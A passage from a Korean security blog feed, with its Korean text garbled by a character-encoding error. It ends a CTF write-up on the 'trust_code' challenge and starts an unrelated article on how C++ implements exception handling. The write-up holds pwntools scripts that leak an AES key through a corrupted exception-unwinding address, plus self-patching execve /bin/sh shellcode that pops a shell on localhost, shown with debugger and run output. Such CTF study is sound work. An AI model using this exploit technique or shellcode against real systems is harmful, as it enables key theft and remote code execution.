ë”°ë¼ì„œ ì´ í•„ë“œì˜ ê°’ì„ ì ì ˆíˆ ë³€ì¡°í•˜ë©´ ì›í•˜ëŠ” ëœë”© íŒ¨ë“œë¥¼ ë°©ë¬¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•ì„œ <code>run</code> í•¨ìˆ˜ëŠ” ì¶œë ¥ ë£¨í‹´ì¸ <code>Shellcode</code> ì˜ ì†Œë©¸ìë¥¼ í˜¸ì¶œí•˜ëŠ” ëœë”© íŒ¨ë“œë¥¼ ê°€ì§€ê³  ìˆì—ˆìŠµë‹ˆë‹¤. <code>context-&gt;ra</code> í•„ë“œì˜ ê°’ì„ <code>run</code> í•¨ìˆ˜ ë‚´ë¶€ì—ì„œ <code>read_code</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” <code>run+23</code> ìœ¼ë¡œ ë³€ì¡°í•˜ë©´, personality ë£¨í‹´ì€ ì´ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ëœë”© íŒ¨ë“œì˜ ì£¼ì†Œë¥¼ êµ¬í•©ë‹ˆë‹¤. ê·¸ ê²°ê³¼ ì‹¤í–‰ íë¦„ì´ ì˜®ê²¨ì§€ë©´ <code>run</code> í•¨ìˆ˜ì˜ ëœë”© íŒ¨ë“œë¥¼ ë‹¤ì‹œ ë°©ë¬¸í•˜ê²Œ ë©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass run</span><br><span class="line">Dump of assembler code for function run():</span><br><span class="line">   0x000055d6cf1f7610 &lt;+0&gt;:     sub    rsp,0x48</span><br><span class="line">   0x000055d6cf1f7614 &lt;+4&gt;:     mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x000055d6cf1f761d &lt;+13&gt;:    mov    QWORD PTR [rsp+0x40],rax</span><br><span class="line">   0x000055d6cf1f7622 &lt;+18&gt;:    call   0x55d6cf1f7370 &lt;read_code()&gt;</span><br><span class="line">   0x000055d6cf1f7627 &lt;+23&gt;:    mov    QWORD PTR [rsp],rax</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><p>ê·¸ëŸ°ë° ë³€ì¡°ë˜ëŠ” ê°’ì€ <code>context-&gt;ra</code> ë§Œì´ë¯€ë¡œ, í”„ë ˆì„ ìì²´ëŠ” <code>service</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” <code>launch</code> í•¨ìˆ˜ë¡œ ë˜ê°ì•„ì§„ ìƒíƒœì—ì„œ ì‹¤í–‰ íë¦„ë§Œ <code>run</code> í•¨ìˆ˜ì˜ ëœë”© íŒ¨ë“œë¡œ ì˜®ê²¨ì§€ê²Œ ë©ë‹ˆë‹¤. ê·¸ë¦¬ê³  <code>launch</code> í•¨ìˆ˜ëŠ” ì„œë²„ì— ì¡´ì¬í•˜ëŠ” AES í‚¤ ê°’ì¸ <code>secret_key.txt</code> íŒŒì¼ì„ ì½ì–´ ìŠ¤íƒ ë²„í¼ì— ì €ì¥í•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ëœë”© íŒ¨ë“œì—ì„œ <code>Shellcode</code> êµ¬ì¡°ì²´ì˜ ì†Œë©¸ìëŠ” ìŠ¤íƒì— ì„ ì–¸ëœ <code>sc.code</code> ë¼ê³  ìƒê°ë˜ëŠ” ê°’ì„ ì¶œë ¥í•˜ê² ì§€ë§Œ, ì‹¤ì œë¡œëŠ” <code>launch</code> í•¨ìˆ˜ì˜ í”„ë ˆì„ì— ì¡´ì¬í•˜ëŠ” AES í‚¤ ê°’ì´ ì¶œë ¥ë  ê²ƒì…ë‹ˆë‹¤.</p><p>ë°”ì´ë„ˆë¦¬ì—ì„œ <code>run+23</code> ì½”ë“œì˜ ì˜¤í”„ì…‹ì€ <code>0x1627</code> ì…ë‹ˆë‹¤. ASLRì— ì˜í•´ í•˜ìœ„ 12ë¹„íŠ¸ë¥¼ ì œì™¸í•œ ì£¼ì†ŒëŠ” ëŸ°íƒ€ì„ì— ëœë¤í•˜ê²Œ ì •í•´ì§€ë¯€ë¡œ, ì‹¤ì œ ì£¼ì†Œì˜ í•˜ìœ„ 2ë°”ì´íŠ¸ê°€ <code>0x5627</code> ì´ë¼ê³  ê°€ì •í•˜ë©´ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mn>16</mn></mrow><annotation encoding="application/x-tex">1/16</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/16</span></span></span></span></eq>ì˜ í™•ë¥ ë¡œ ì¼ì¹˜í•˜ê²Œ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ë‹¤ìŒê³¼ ê°™ì´ <code>key</code> ê°’ì„ ìœ ì¶œí•˜ê¸° ìœ„í•œ ì½”ë“œë¥¼ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1234</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./trust_code&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r.sendafter(<span class="string">b&quot;iv&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">24</span> + <span class="string">b&quot;\x27\x56&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;code&gt;&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ì…¸ ìŠ¤í¬ë¦½íŠ¸ë¡œ ë¬´í•œ ë£¨í”„ë¥¼ ë§Œë“¤ì–´ ì„±ê³µí•  ë•Œê¹Œì§€ ë°˜ë³µ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ <code>key</code> ê°’ì¸ <code>&quot;USER_SECRET_KEY!&quot;</code> ê°€ ì¶œë ¥ë¨ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ while [ true ]; do ./leak.py; done</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">...</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    b&#x27;iv&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x1a bytes:</span><br><span class="line">    b&quot;aaaaaaaaaaaaaaaaaaaaaaaa&#x27;V&quot;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    b&#x27;code&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x8 bytes:</span><br><span class="line">    b&#x27;a&#x27; * 0x8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0xa5 bytes:</span><br><span class="line">    00000000  0a 3d 20 45  78 65 63 75  74 65 64 20  3d 0a 00 00  â”‚Â·= Eâ”‚xecuâ”‚ted â”‚=Â·Â·Â·â”‚</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 0a 3d  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·=â”‚</span><br><span class="line">    00000030  20 45 78 65  63 75 74 65  64 20 3d 0a  00 1c 01 00  â”‚ Exeâ”‚cuteâ”‚d =Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000040  00 00 00 00  79 00 00 00  00 00 00 00  55 53 45 52  â”‚Â·Â·Â·Â·â”‚yÂ·Â·Â·â”‚Â·Â·Â·Â·â”‚USERâ”‚</span><br><span class="line">    00000050  5f 53 45 43  52 45 54 5f  4b 45 59 21  0a 53 6f 72  â”‚_SECâ”‚RET_â”‚KEY!â”‚Â·Sorâ”‚</span><br><span class="line">    00000060  72 79 20 66  6f 72 20 74  68 65 20 69  6e 63 6f 6e  â”‚ry fâ”‚or tâ”‚he iâ”‚nconâ”‚</span><br><span class="line">    00000070  76 65 6e 69  65 6e 63 65  2c 20 74 68  65 72 65 20  â”‚veniâ”‚enceâ”‚, thâ”‚ere â”‚</span><br><span class="line">    00000080  77 61 73 20  61 20 70 72  6f 62 6c 65  6d 20 77 68  â”‚was â”‚a prâ”‚obleâ”‚m whâ”‚</span><br><span class="line">    00000090  69 6c 65 20  64 65 63 72  79 70 74 69  6e 67 20 63  â”‚ile â”‚decrâ”‚yptiâ”‚ng câ”‚</span><br><span class="line">    000000a0  6f 64 65 2e  0a                                     â”‚ode.â”‚Â·â”‚</span><br><span class="line">    000000a5</span><br><span class="line"></span><br><span class="line">= Executed =</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">= Executed =</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00SER_SECRET_KEY!</span><br><span class="line">Sorry for the inconvenience, there was a problem while decrypting code.</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure><p><code>key</code> ê°’ì„ ìœ ì¶œí•˜ì˜€ìœ¼ë¯€ë¡œ ì…¸ì½”ë“œë¥¼ ì•”í˜¸í™”í•˜ì—¬ ì „ì†¡í•˜ë©´ ë˜ëŠ”ë°, <code>\x0f</code> ì™€ <code>\x05</code> ë¥¼ ì‚¬ìš©í•˜ë©´ ì‹¤íŒ¨í•˜ëŠ” ì¡°ê±´ì´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ <code>syscall</code> ì™€ <code>sysenter</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ í†µí•´ ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° ì½”ë“œê°€ ë³µì‚¬ í›„ ì‹¤í–‰ë˜ëŠ” ì˜ì—­ì€ ì“°ê¸°ì™€ ì‹¤í–‰ì´ ëª¨ë‘ ê°€ëŠ¥í•œ rwx í˜ì´ì§€ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ëŸ°íƒ€ì„ì— ë™ì ìœ¼ë¡œ ì…¸ì½”ë“œì˜ ë‚´ìš©ì„ ìˆ˜ì •í•˜ëŠ” ì½”ë“œë¥¼ ì¶”ê°€í•˜ë©´ <code>syscall</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì‚¬ìš©ìê°€ ì…ë ¥í•œ ì½”ë“œë¥¼ í˜¸ì¶œí•˜ëŠ” ë¶€ë¶„ì€ <code>execute+57</code> ì…ë‹ˆë‹¤. ì´ ì£¼ì†Œì— ì¤‘ë‹¨ì ì„ ê±¸ê³  ì‹¤í–‰í•˜ë©´ í•´ë‹¹ ìœ„ì¹˜ì—ì„œ <code>rax</code> ë ˆì§€ìŠ¤í„°ì—ëŠ” rwx í˜ì´ì§€ì˜ ì£¼ì†Œ, <code>rsi</code> ë ˆì§€ìŠ¤í„°ì—ëŠ” <code>0x1000</code> ì´ ì €ì¥ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x000055f56b7fb589 in execute(unsigned char*) ()</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> â–º 0x55f56b7fb589    call   qword ptr [rsp + 8]           &lt;0x7fb6a29c7000&gt;</span><br><span class="line"></span><br><span class="line">   0x55f56b7fb58d    mov    rdi, qword ptr [rsp + 8]</span><br><span class="line">   0x55f56b7fb592    mov    esi, 0x1000</span><br><span class="line">pwndbg&gt; i r rax rsi</span><br><span class="line">rax            0x7fb6a29c7000      140422388936704</span><br><span class="line">rsi            0x1000              4096</span><br><span class="line">pwndbg&gt; vmmap $rax</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7fb6a29c7000     0x7fb6a29c8000 rwxp     1000 0      [anon_7fb6a29c7] +0x0</span><br></pre></td></tr></table></figure><p>ì´ë“¤ ë ˆì§€ìŠ¤í„°ì˜ ê°’ì„ ì´ìš©í•˜ì—¬ ì…¸ì½”ë“œì˜ ë§ˆì§€ë§‰ 2ë°”ì´íŠ¸ì— <code>\x0f\x05</code> ë¥¼ ëŒ€ì…í•˜ëŠ” ì½”ë“œë¥¼ ì¶”ê°€í•œ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì‘ì„±í•©ë‹ˆë‹¤. ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë©´ ì…¸ì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1234</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sc = <span class="string">b&quot;\x66\x81\xee\xf1\x0a\x66\x89\x70\x1e&quot;</span>    <span class="comment"># sub si,0xaf1 ; mov [rax+30],si</span></span><br><span class="line">    sc += <span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\xff\xff&quot;</span>   <span class="comment"># \xff\xff becomes \x0f\x05</span></span><br><span class="line"></span><br><span class="line">    key = <span class="string">b&quot;USER_SECRET_KEY!&quot;</span></span><br><span class="line">    iv = <span class="string">b&quot;a&quot;</span> * <span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv=iv)</span><br><span class="line">    ct = cipher.encrypt(<span class="string">b&quot;TRUST_CODE_ONLY!&quot;</span> + sc)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">b&quot;iv&gt;&quot;</span>, iv)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;code&gt;&quot;</span>, ct)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">$</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Security/">Security</category>
      
      <category domain="https://juhyun167.github.io/categories/Security/CTF/">CTF</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/07/30/line22-trust-code/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>C++ ì˜ˆì™¸ ì²˜ë¦¬ì˜ êµ¬í˜„</title>
      <link>https://juhyun167.github.io/2022/07/17/cpp-exception-handling/</link>
      <guid>https://juhyun167.github.io/2022/07/17/cpp-exception-handling/</guid>
      <pubDate>Sun, 17 Jul 2022 22:49:43 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;p&gt;C++ì˜ ì˜ˆì™¸ ì²˜ë¦¬ì— ì‚¬ìš©ë˜ëŠ” try-catch êµ¬ë¬¸ì„ ì»´íŒŒì¼ëŸ¬ ìˆ˜ì¤€ì—ì„œ ì–´ë–»ê²Œ êµ¬í˜„í•˜ê³  ìˆëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;%EC%98%88%EC</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><p>C++ì˜ ì˜ˆì™¸ ì²˜ë¦¬ì— ì‚¬ìš©ë˜ëŠ” try-catch êµ¬ë¬¸ì„ ì»´íŒŒì¼ëŸ¬ ìˆ˜ì¤€ì—ì„œ ì–´ë–»ê²Œ êµ¬í˜„í•˜ê³  ìˆëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.</p><h2 id="%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC" tabindex="-1">ì˜ˆì™¸ ì²˜ë¦¬</h2><h3 id="try-catch-%EA%B5%AC%EB%AC%B8" tabindex="-1">try-catch êµ¬ë¬¸</h3><p>ì˜ˆì™¸ ì²˜ë¦¬(exception handling)ëŠ” í”„ë¡œê·¸ë¨ì˜ ì‹¤í–‰ ì¤‘ ë°œìƒí•˜ëŠ” ë¹„ì •ìƒì ì¸ ìƒí™©ì— ëŒ€ì‘í•˜ê¸° ìœ„í•œ ë°©ë²•ë¡ ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì˜ˆì™¸ ì²˜ë¦¬ë¥¼ ì‚¬ìš©í•˜ëŠ” í”„ë¡œê·¸ë¨ì€ ë³´í†µ ë¹„ì •ìƒ ìƒí™©ì„ ë°œê²¬í•˜ê³  ì˜ˆì™¸ë¥¼ ì¼ìœ¼í‚¤ëŠ” ë¶€ë¶„ê³¼ ì˜ˆì™¸ì— ëŒ€ì‘í•˜ëŠ” ë¶€ë¶„ì´ ë‚˜ëˆ„ì–´ì ¸ ìˆìŠµë‹ˆë‹¤. C++ì˜ ì˜ˆì™¸ ì²˜ë¦¬ëŠ” throw êµ¬ë¬¸ìœ¼ë¡œ ì˜ˆì™¸ë¥¼ ì¼ìœ¼í‚¤ê³ , try-catch êµ¬ë¬¸ìœ¼ë¡œ ì˜ˆì™¸ì— ëŒ€ì‘í•˜ëŠ” ë°©ì‹ì„ ì‚¬ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><p>throw êµ¬ë¬¸ì€ ì¸ìë¥¼ ë°›ì•„ ì˜ˆì™¸ë¥¼ ì¼ìœ¼í‚µë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ <code>std::exception</code> ì„ ìƒì†í•œ <code>std::runtime_error</code> ë“±ì˜ ì˜ˆì™¸ í´ë˜ìŠ¤ë¥¼ ì¸ìë¡œ ì‚¬ìš©í•˜ì§€ë§Œ, ì‹¤ì œë¡œëŠ” ì •ìˆ˜í˜• ê°’ì´ë‚˜ ë¬¸ìì—´ ë“± ì•„ë¬´ ê°’ì´ë‚˜ ì¸ìë¡œ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (password.<span class="built_in">length</span>() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>try-catch êµ¬ë¬¸ì€ try ë¸”ë¡ê³¼ catch ë¸”ë¡ìœ¼ë¡œ ë‚˜ëˆ„ì–´ì§‘ë‹ˆë‹¤. try ë¸”ë¡ ì´í›„ì— í•˜ë‚˜ ì´ìƒì˜ catch ë¸”ë¡ì´ ì´ì–´ì§€ë©°, try ë¸”ë¡ì˜ ì½”ë“œì—ì„œ ë°œìƒí•œ ì˜ˆì™¸ì— ëŒ€í•´ catch ë¸”ë¡ì˜ ì½”ë“œê°€ ëŒ€ì‘í•©ë‹ˆë‹¤. catch ë¸”ë¡ì€ ìì‹ ì´ ëŒ€ì‘í•  ì˜ˆì™¸ì˜ íƒ€ì…ì„ ì„ ì–¸í•˜ì—¬ í•´ë‹¹í•˜ëŠ” íƒ€ì…ì˜ ì˜ˆì™¸ê°€ ë°œìƒí•˜ì˜€ì„ ê²½ìš°ì—ë§Œ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ë§Œì•½ ë°œìƒí•œ ì˜ˆì™¸ì— í•´ë‹¹í•˜ëŠ” catch ë¸”ë¡ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ ì˜ˆì™¸ë¥¼ ì²˜ë¦¬í•  ìˆ˜ ì—†ìœ¼ë©´ ë‚´ë¶€ì ìœ¼ë¡œ <code>std::terminate</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ í”„ë¡œê·¸ë¨ì„ ì¢…ë£Œí•©ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">std::string s = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    s.<span class="built_in">substr</span>(<span class="number">11</span>);</span><br><span class="line">&#125; <span class="built_in">catch</span> (<span class="type">const</span> std::exception&amp; e) &#123;</span><br><span class="line">    std::cout &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;  <span class="comment">// basic_string::substr: __pos (which is 11) &gt; this-&gt;size() (which is 5)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>throw êµ¬ë¬¸ì´ ì˜ˆì™¸ë¥¼ ì¼ìœ¼í‚¤ë©´ í”„ë¡œê·¸ë¨ì€ í˜¸ì¶œ ìŠ¤íƒì„ ê±°ìŠ¬ëŸ¬ ì˜¬ë¼ê°€ë©° ì˜ˆì™¸ë¥¼ ì²˜ë¦¬í•´ì¤„ catch ë¸”ë¡ì„ ê²€ìƒ‰í•©ë‹ˆë‹¤. ì´ ê³¼ì •ì„ ìŠ¤íƒ ë˜ê°ê¸°(stack unwinding)ë¼ê³  í•©ë‹ˆë‹¤. ìŠ¤íƒì„ ë˜ê°ëŠ” ë„ì¤‘ ì˜ˆì™¸ê°€ ë°œìƒí•œ ì§€ì ê³¼ catch ë¸”ë¡ ì‚¬ì´ì˜ ì½”ë“œì—ì„œ ì„ ì–¸í•œ ê°ì²´ì— ëŒ€í•´ì„œëŠ” ìë™ìœ¼ë¡œ ì†Œë©¸ìë¥¼ í˜¸ì¶œí•˜ë„ë¡ ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” C++ì˜ RAII(Resource Acquision is Initialization) ì›ì¹™ì„ ë”°ë¥´ê¸° ìœ„í•¨ì…ë‹ˆë‹¤. RAIIëŠ” ìì›ì˜ ëˆ„ìˆ˜(leak)ë¥¼ ë§‰ê¸° ìœ„í•´ ê°ì²´ì˜ ìˆ˜ëª…ì´ ëë‚  ë•Œ ê°ì²´ê°€ íšë“í•œ ìì›ë„ í•´ì œí•˜ë„ë¡ í•˜ëŠ” ì›ì¹™ì…ë‹ˆë‹¤. ì˜ˆì™¸ê°€ ë°œìƒí•œ ê²½ìš° ìƒì„±í•œ ê°ì²´ì˜ ì†Œë©¸ìë¥¼ í˜¸ì¶œí•˜ëŠ” ì½”ë“œì— ë„ë‹¬í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ ì§ì ‘ í˜¸ì¶œí•´ì£¼ëŠ” ê²ƒì…ë‹ˆë‹¤.</p><p>ë‹¤ìŒ ê·¸ë¦¼ì´ ë‚˜íƒ€ë‚´ëŠ” ì½”ë“œëŠ” <code>main</code> í•¨ìˆ˜ì˜ try ë¸”ë¡ì—ì„œ <code>func</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. <code>func</code> í•¨ìˆ˜ëŠ” <code>MyClass</code> ê°ì²´ë¥¼ í• ë‹¹í•œ í›„ <code>func2</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³ , <code>func2</code> í•¨ìˆ˜ ë‚´ì—ì„œ ì˜ˆì™¸ê°€ ë°œìƒí•©ë‹ˆë‹¤. ë³´ë¼ìƒ‰ìœ¼ë¡œ í‘œì‹œí•œ ì½”ë“œëŠ” ìŠ¤íƒì„ ë˜ê°ëŠ” ë¶€ë¶„ìœ¼ë¡œ, ìŠ¤íƒì„ í•œ ë²ˆ ë˜ê°ì€ í›„ <code>func</code> í•¨ìˆ˜ê°€ í• ë‹¹í•œ <code>MyClass</code> ê°ì±„ì˜ ì†Œë©¸ìë¥¼ í˜¸ì¶œí•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/cpp-exception-handling/1.png" alt="1.png"></p><p>ìœ„ì˜ ë‚´ìš©ì„ ì½”ë“œë¡œ ë‚˜íƒ€ë‚´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ì»´íŒŒì¼í•˜ê³  ì‹¤í–‰í•˜ë©´ <code>main</code> í•¨ìˆ˜ì˜ catch ë¸”ë¡ì— ë„ë‹¬í•˜ê¸° ì „ <code>MyClass</code> ê°ì²´ì˜ ì†Œë©¸ìê°€ í˜¸ì¶œë˜ë©° â€œdestructor called.â€ ë¬¸ìì—´ì„ ì¶œë ¥í•©ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 